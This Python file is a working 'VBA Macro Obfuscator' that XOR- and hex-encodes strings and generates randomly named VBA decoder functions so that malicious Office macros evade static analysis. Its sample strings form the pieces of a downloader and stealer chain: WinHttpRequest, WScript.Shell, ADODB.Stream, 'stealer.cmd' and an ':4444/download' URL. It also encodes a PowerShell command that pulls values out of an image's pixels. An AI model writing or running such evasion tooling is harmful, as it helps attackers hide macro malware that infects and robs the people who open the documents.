"""
VBA Macro Obfuscator
Provides XOR encoding and hexadecimal conversion functions
to obfuscate VBA macro strings and make static analysis difficult.
"""

import random
import string


def xor_encode(text: str, key: int) -> str:
    """
    Encode a string using XOR cipher.
    
    Args:
        text: The plaintext string to encode
        key: The XOR key (0-255)
        
    Returns:
        XOR encoded string
    """
    encoded = ''.join(chr(ord(c) ^ key) for c in text)
    return encoded


def xor_to_hex(text: str, key: int) -> str:
    """
    Encode a string using XOR cipher and convert to hexadecimal.
    Useful for complex strings like PowerShell scripts.
    
    Args:
        text: The plaintext string to encode
        key: The XOR key (0-255)
        
    Returns:
        Hexadecimal representation of XOR encoded string
    """
    encoded = xor_encode(text, key)
    hex_string = ''.join(format(ord(c), '02X') for c in encoded)
    return hex_string


def generate_random_name(length: int = 8) -> str:
    """
    Generate a random variable/function name.
    
    Args:
        length: Length of the random name
        
    Returns:
        Random string suitable for VBA identifiers
    """
    return ''.join(random.choices(string.ascii_lowercase, k=length))


def generate_vba_xor_decoder() -> str:
    """
    Generate VBA function for XOR decoding.
    
    Returns:
        VBA code for XOR decoder function
    """
    func_name = generate_random_name()
    return f'''Function {func_name}(ByVal donda3 As String, ByVal vsdad As Integer) As String
Dim dadadwvarf As Integer, pdsajdwqd As String
pdsajdwqd = ""
For dadadwvarf = 1 To Len(donda3)
pdsajdwqd = pdsajdwqd & Chr(Asc(Mid(donda3, dadadwvarf, 1)) Xor vsdad)
Next dadadwvarf
{func_name} = pdsajdwqd
End Function''', func_name


def generate_vba_hex_decoder() -> str:
    """
    Generate VBA function for hexadecimal decoding.
    
    Returns:
        VBA code for hex decoder function
    """
    func_name = generate_random_name()
    return f'''Function {func_name}(ByVal udiawpsd As String) As String
Dim retossdqqa As Integer, popollsisq As String
popollsisq = ""
For retossdqqa = 1 To Len(udiawpsd) Step 2
popollsisq = popollsisq & Chr(CLng("&H" & Mid(udiawpsd, retossdqqa, 2)))
Next retossdqqa
{func_name} = popollsisq
End Function''', func_name


def obfuscate_string(text: str, use_hex: bool = False) -> tuple:
    """
    Obfuscate a string for use in VBA.
    
    Args:
        text: The string to obfuscate
        use_hex: Whether to use hex encoding (for complex strings)
        
    Returns:
        Tuple of (obfuscated_string, xor_key, needs_hex_decode)
    """
    key = random.randint(10, 50)
    
    if use_hex:
        encoded = xor_to_hex(text, key)
        return encoded, key, True
    else:
        encoded = xor_encode(text, key)
        return encoded, key, False


def main():
    print("=" * 60)
    print("VBA Macro Obfuscator")
    print("=" * 60)
    
    # Example strings to obfuscate
    test_strings = [
        ("WinHttp.WinHttpRequest.5.1", False),
        ("WScript.Shell", False),
        ("ADODB.Stream", False),
        (".\output.txt", False),
        (".\img.png", False),
        (".\stealer.cmd", False),
        ("http://", False),
        (":4444/download", False),
        ("GET", False),
    ]
    
    # Complex PowerShell script (use hex encoding)
    ps_script = '''powershell -Command "Add-Type -AssemblyName System.Drawing; $imagePath = '.\\img.png'; $bitmap = [System.Drawing.Bitmap]::FromFile($imagePath); $pixelValues = ''; for ($x = 0; $x -lt 4; $x++) { $color = $bitmap.GetPixel($x, 0); if ($x -gt 0) { $pixelValues += '.' }; $pixelValues += $color.R; }; $bitmap.Dispose(); Set-Content -Path '.\\output.txt' -Value $pixelValues"'''
    
    print("\n[+] Generating decoder functions...")
    xor_decoder, xor_func = generate_vba_xor_decoder()
    hex_decoder, hex_func = generate_vba_hex_decoder()
    
    print(f"\n[+] XOR Decoder Function Name: {xor_func}")
    print(f"[+] HEX Decoder Function Name: {hex_func}")
    
    print("\n" + "=" * 60)
    print("Obfuscated Strings:")
    print("=" * 60)
    
    for text, use_hex in test_strings:
        encoded, key, is_hex = obfuscate_string(text, use_hex)
        print(f'\nOriginal: "{text}"')
        print(f'Key: {key}')
        print(f'Encoded: "{encoded}"')
        print(f'VBA Call: {xor_func}("{encoded}", {key})')
    
    print("\n" + "=" * 60)
    print("PowerShell Script (XOR + HEX):")
    print("=" * 60)
    
    encoded_ps, key_ps, _ = obfuscate_string(ps_script, use_hex=True)
    print(f'\nKey: {key_ps}')
    print(f'Encoded (first 100 chars): {encoded_ps[:100]}...')
    print(f'VBA Call: {xor_func}({hex_func}("{encoded_ps}"), {key_ps})')
    
    print("\n" + "=" * 60)
    print("VBA Decoder Functions:")
    print("=" * 60)
    print(f"\n{xor_decoder}")
    print(f"\n{hex_decoder}")


if __name__ == "__main__":
    main()
